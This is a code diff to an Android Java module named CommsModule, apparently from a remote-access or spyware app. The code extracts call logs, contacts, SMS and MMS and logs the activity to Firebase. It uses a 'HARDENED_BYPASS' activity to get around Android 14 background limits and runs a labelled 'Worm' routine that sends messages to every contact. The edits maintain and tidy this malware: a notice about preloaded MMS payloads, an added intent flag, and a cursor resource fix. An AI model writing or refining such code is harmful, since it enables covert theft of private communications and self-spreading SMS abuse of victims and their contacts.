@@ -85,7 +85,7 @@ public class CommsModule extends BaseModule {
         FirebaseConfig.logActivity("COMMS_EXTRACT: Call history retrieved");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
         html.append("<div class=\"back-btn-container\">");
-        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
+        html.append("<a href=\"/terminal\" class=\"btn-back\">&#8592; Back to Terminal</a>");
         html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">RECENT_CALL_LOGS</h2>");
@@ -274,7 +274,7 @@ public class CommsModule extends BaseModule {
         FirebaseConfig.logActivity("CONTACT_EXTRACT: Address book retrieved");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
         html.append("<div class=\"back-btn-container\">");
-        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
+        html.append("<a href=\"/terminal\" class=\"btn-back\">&#8592; Back to Terminal</a>");
         html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">CONTACT_DATABASE</h2>");
@@ -422,7 +422,7 @@ public class CommsModule extends BaseModule {
         FirebaseConfig.logActivity("COMMS_EXTRACT: SMS history retrieved");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
         html.append("<div class=\"back-btn-container\">");
-        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
+        html.append("<a href=\"/terminal\" class=\"btn-back\">&#8592; Back to Terminal</a>");
         html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">&#128233; SMS_TERMINAL</h2>");
@@ -520,7 +520,7 @@ public class CommsModule extends BaseModule {
         FirebaseConfig.logActivity("COMMS_EXTRACT: MMS media database retrieved");
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
         html.append("<div class=\"back-btn-container\">");
-        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
+        html.append("<a href=\"/terminal\" class=\"btn-back\">&#8592; Back to Terminal</a>");
         html.append("</div>");
         html.append("<div class=\"card\">");
         html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">&#128247; MMS_TERMINAL</h2>");
@@ -864,7 +864,8 @@ public class CommsModule extends BaseModule {
 
             String html = getHeader(session.getUri()) + "<div class=\"card\"><div class=\"empty-state\">";
             if (success) {
-                html += "<div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>MMS Dispatched</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div><p>Media uplink successful. Package sent to: " + escapeHtml(number) + "</p><p style=\"font-size: 0.8rem; color: #888;\">Payload: " + escapeHtml(fileToUpload.getName()) + " (" + (fileToUpload.length() / 1024) + " KB)</p>";
+                html += "<div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>MMS Dispatched</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div><p>Media uplink successful. Package sent to: " + escapeHtml(number) + "</p><p style=\"font-size: 0.8rem; color: #888;\">Payload: " + escapeHtml(fileToUpload.getName()) + " (" + (fileToUpload.length() / 1024) + " KB)</p>" +
+                        "<p style=\"color: var(--neon-cyan); margin-top: 15px; font-size: 0.85rem; line-height: 1.4;\">&#9432; Notice: Due to Android OS restrictions on background MMS, the native messaging app has opened with your payload preloaded. Tap Send to complete delivery (or use Ghost Control if automated device interaction is required).</p>";
             } else {
                 html += "<div class=\"icon\" style=\"color: var(--danger);\">&#10006;</div><h2>MMS Failed</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin: 20px 0 25px 0;\"></div><p>Could not dispatch media package. Check device logs.</p>";
             }
@@ -901,7 +902,7 @@ public class CommsModule extends BaseModule {
 
             // [HARDENED_BYPASS] Route through BypassActivity to satisfy Android 14 background restrictions
             Intent bypass = new Intent(context, com.labs.labrats.CameraHelper.BypassActivity.class);
-            bypass.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            bypass.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
             bypass.putExtra("TARGET_INTENT", callIntent);
             context.startActivity(bypass);
 
@@ -1028,11 +1029,10 @@ public class CommsModule extends BaseModule {
         FirebaseConfig.logActivity("COMMS_BROADCAST: Dispatched mass-messaging sequence (Worm)");
         
         LabRatsWorker.execute(() -> {
-            try {
-                android.database.Cursor cursor = context.getContentResolver().query(
-                        android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                        new String[]{android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER},
-                        null, null, null);
+            try (android.database.Cursor cursor = context.getContentResolver().query(
+                    android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                    new String[]{android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER},
+                    null, null, null)) {
                 
                 if (cursor != null) {
                     String className = "android.telephony.SmsManager";
@@ -1056,7 +1056,6 @@ public class CommsModule extends BaseModule {
                             }
                         }
                     }
-                    cursor.close();
                     FirebaseConfig.logActivity("COMMS_BROADCAST: Sequence Complete. " + count + " units reached.");
                 }
             } catch (Exception e) {
